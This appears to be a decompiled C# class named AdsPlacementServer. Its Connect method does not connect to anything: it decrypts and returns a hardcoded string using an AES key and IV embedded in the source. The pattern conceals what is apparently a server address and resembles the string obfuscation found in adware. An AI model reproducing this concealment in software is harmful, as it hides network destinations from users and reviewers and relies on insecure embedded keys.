using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class AdsPlacementServer
{
	private byte[] Key = new byte[32]
	{
		123,
		217,
		19,
		11,
		24,
		26,
		85,
		45,
		114,
		184,
		27,
		162,
		37,
		112,
		222,
		209,
		241,
		24,
		175,
		144,
		173,
		53,
		196,
		29,
		24,
		26,
		17,
		218,
		131,
		236,
		53,
		209
	};

	private byte[] Vector = new byte[16]
	{
		146,
		64,
		191,
		111,
		23,
		3,
		113,
		119,
		231,
		121,
		252,
		112,
		79,
		32,
		114,
		156
	};

	private ICryptoTransform DecryptorTransform;

	private UTF8Encoding UTFEncoder;

	public AdsPlacementServer()
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		DecryptorTransform = rijndaelManaged.CreateDecryptor(Key, Vector);
		UTFEncoder = new UTF8Encoding();
	}

	public string Connect()
	{
		string str = "020111187025214062129241205171131019008143025106171120081045115119130134071071180026204047074027204158024027204166232097211172193137221216090100";
		return Connect(StrToByteArray(string.Empty + str));
	}

	private string Connect(byte[] EncryptedValue)
	{
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, DecryptorTransform, CryptoStreamMode.Write);
		cryptoStream.Write(EncryptedValue, 0, EncryptedValue.Length);
		cryptoStream.FlushFinalBlock();
		memoryStream.Position = 0L;
		byte[] array = new byte[memoryStream.Length];
		memoryStream.Read(array, 0, array.Length);
		memoryStream.Close();
		return UTFEncoder.GetString(array);
	}

	private byte[] StrToByteArray(string str)
	{
		if (str.Length == 0)
		{
			throw new Exception("Invalid string value in StrToByteArray");
		}
		byte[] array = new byte[str.Length / 3];
		int num = 0;
		int num2 = 0;
		do
		{
			byte b = byte.Parse(str.Substring(num, 3));
			array[num2++] = b;
			num += 3;
		}
		while (num < str.Length);
		return array;
	}
}
